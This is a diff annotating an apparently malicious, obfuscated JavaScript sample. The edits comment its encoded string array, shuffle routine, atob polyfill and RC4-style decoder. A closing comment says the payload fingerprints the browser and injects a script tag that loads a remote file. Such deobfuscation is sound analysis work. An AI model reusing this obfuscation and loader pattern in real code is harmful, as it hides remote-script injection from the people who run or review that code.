@@ -1,7 +1,7 @@
 
      var list_of_str=['w6rChcKeWsKXw7TCocOlNF8Kw7bCuMKdKsOWTMKjF2A=','V3PClhXDu8OCCMO5WwbCp8KhD8KVw7LDo8KOwr7CiA==','w6saBzVaIwbDk8OqHMKGwpvDgzzCixMTMMOL','w5HClUhaw5TDlQM6GVJMS8KmD8KYXTfCgynCtxU=','w6rDkRl2ehcFDcOVVBpibHlAIG4IKcOq','wr3Co8K0QsOGGsO2WcOHDMKpwoxSVGJKc8OHMBbCgivDnA==','WMKMQXbCpAzCpcOJP0HCkSXCuTQP','ZcOXAsOfw5rChMOGVsOESXEI','w6LDu2h7wrAwFcON','w6Ikw4nClFQZw5RHw5Rvwo/DhcKGacO8','w7V9wrrDrkEaMcOVaWbDv8Ka','w5LDqwtPahEeEsOSUzFy','w7PDkcOBUcK+w7U=','XcKpw7LDgW7DglZ+','RcKzwqc2RcOEH2vDhw==','dsKZw4/DnHvDg0x0wqdPZg==','w6HDhsOqaH7CrMOSw5I=','dMOFw6DCiQ==','F8O8w5o7LmbCsgA=','QcK0w4TDkw==','wpXCg8ODOcKow5DColY=','w7pqwqvDiQ==','w7DDmcOuVsKTw5LDrg==','w5Uvw4vCr8OIVAZLw6zCn0HCuEk=','dWLCjxM=','eMOGwpbDgDPCjFzCs8KubV4geW/Cvg==','wozCuErDo8KlBsODUQc=','w4IoZMK5w5s=','w4lTHA==','w4bCrsKbVsKbw7fCusOqOw==','w6JEwrjCgTvCjRdYIcOjw5hZYSZr','w7jDh8O6VsKFw7nDi8ONw4nCrjE=','wpXCicOOP8Kow5E=','w5PDvBBjXQ0NCcOzSSFy','RQ7CvcO3O2fDhsK6w5fCgg==','w6VDwrrChhXChx1JJcO7','w6ouw4TChk0U','wpbDtMOJw613HDA=','w5PDsUDDohvDlsKE','KMKGZ8KbccON','w6PDjMO7U8Kpw640wq8=','wpbDtMOdw754HTHChg==','wo4NT8KFwowHw5B0wrciwqI=','RWI6Un7DvhxXwptFaw==','w6XDsVdqwqwwDsOH','wopbwpBEQWLCiWbDkCd8','w6Jwwq/DgUEBLg==','D8O8w6ouKGbCswk=','wpAGQ8KEwowmw4N4wqI=','w6rCicKMU8KQw77CusO5L2Uxw63CmMK0GcOfWsKtEWE5wrM=','w5dGbMO4J8Kxw4oAwpjChzgS','wrgQRMKMwpshw5xowr0=','V3PCkhXDtcODFMO5WA7CisKbCsKXw6zDv8Kfwr7CssKFw5U='];
 
-
+     // mixing the list of encrypted strings while 0x15e not equal to 0
     (function(list,_0x524125){
       var _0x1212d5 = function(_0x2b1926){
         while(--_0x2b1926){
@@ -11,12 +11,22 @@
       _0x1212d5(++_0x524125);
     }(list_of_str,0x15e));
 
+
+    /**
+    * @param {string} param_one = id of the encrypted string in the list_of_str array
+    * @param {string} param_two = needed to decode the encrypted strings
+    * @return {string} _0x432180 = decoded string
+    */
      function check_smth( param_one , param_two){
 
       param_one = param_one-0x0; //converting to number
      	var nth_str_in_list = list_of_str[param_one];
 
+      /**
+      * @return {object} window object
+      */
   	   function asd2 (){
+           // get window object
       			var return_window= function(){
       				var _0x33748d;
       				try{
@@ -29,6 +39,8 @@
       				var _0x5c685e = return_window();
 
       				var _0x3e3156='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+=';
+
+              // checks if atob() is exists if not create one
       				_0x5c685e['atob'] || (_0x5c685e['atob'] = function(encoded_string){
       					var _0x292610 = String(encoded_string)['replace'](/=+$/,'');
       					for(var _0x151bd2=0x0 , _0x558098 , _0xd7aec1 , _0x230f38=0x0,_0x948b6c='';
@@ -36,7 +48,7 @@
       							~_0xd7aec1&&(_0x558098=_0x151bd2%0x4?_0x558098*0x40+_0xd7aec1:_0xd7aec1,_0x151bd2++%0x4)?_0x948b6c+=String['fromCharCode'](0xff&_0x558098>>(-0x2*_0x151bd2&0x6)):0x0){
       						_0xd7aec1=_0x3e3156['indexOf'](_0xd7aec1);
       					}
-                console.log(_0x948b6c)
+
       					return _0x948b6c;
       				}
       		);
@@ -45,7 +57,10 @@
 
 
 
-
+      /**
+      * @param {string} arg_one = encrypted string
+      * @param {string} arg_two = string which helps to decrypt the arg_one string
+      */
       function asd(arg_one,arg_two) {
 
           var array_of_numbers=[],_0x4ce2f1=0,_0x333808,_0x432180='',string_result_for='';arg_one=atob(arg_one);
@@ -54,7 +69,6 @@
           }
 
          arg_one=decodeURIComponent(string_result_for);
-         //console.log(arg_one)
 
          for(let i=0; i<256 ;i++){
              array_of_numbers[i]=i;
@@ -93,7 +107,7 @@
       }
 
 
-
+      // give check_smth['Pjsvdu'] the asd function for later use
       check_smth['Pjsvdu']=asd;
       check_smth['vLOTlN']={};
       check_smth['ZyRSGR']=!![];
@@ -106,7 +120,7 @@
         if(check_smth['DuRerv']===undefined){
           check_smth['DuRerv']=!![];
         }
-
+        // using the asd funtion here with params
         nth_str_in_list= check_smth['Pjsvdu'](nth_str_in_list,param_two);
         check_smth['vLOTlN'][param_one]=nth_str_in_list;
 
@@ -127,6 +141,10 @@
     	return enc_return_string;
     }
 
+    /** the object where the payload created
+    * it checks many system/browser related things
+    * and creates a <script> tag with src="cmljx14.js?rbmcpgy=ODA="
+    */
 
   /*  var a=[
     	navigator['userAgent'],
